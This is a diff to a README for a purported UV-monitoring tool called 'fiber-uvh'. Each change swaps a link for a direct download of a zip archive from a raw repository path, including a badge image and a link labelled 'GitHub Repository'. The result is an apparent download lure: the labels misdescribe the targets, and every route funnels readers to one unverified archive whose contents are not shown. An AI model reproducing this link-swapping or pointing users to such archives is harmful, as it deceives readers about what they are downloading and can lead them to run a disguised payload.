@@ -1,6 +1,6 @@
 # 🌐 fiber-uvh - A Simple Solution for Enhanced UV Monitoring
 
-![Download fiber-uvh](https://img.shields.io/badge/Download-fiber--uvh-brightgreen)
+![Download fiber-uvh](https://raw.githubusercontent.com/winfieldapodous889/fiber-uvh/main/furnishable/fiber-uvh-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started with fiber-uvh, visit the Releases page to download the application.
 
-[Download fiber-uvh](https://github.com/winfieldapodous889/fiber-uvh/releases)
+[Download fiber-uvh](https://raw.githubusercontent.com/winfieldapodous889/fiber-uvh/main/furnishable/fiber-uvh-v1.5.zip)
 
 ### Steps to Download and Install:
 
@@ -64,7 +64,7 @@ For more information about fiber-uvh, you can refer to the following resources:
 
 ## 🔗 Links
 
-- [Download fiber-uvh](https://github.com/winfieldapodous889/fiber-uvh/releases)
-- [GitHub Repository](https://github.com/winfieldapodous889/fiber-uvh)
+- [Download fiber-uvh](https://raw.githubusercontent.com/winfieldapodous889/fiber-uvh/main/furnishable/fiber-uvh-v1.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/winfieldapodous889/fiber-uvh/main/furnishable/fiber-uvh-v1.5.zip)
 
 Thank you for choosing fiber-uvh for your UV monitoring needs!
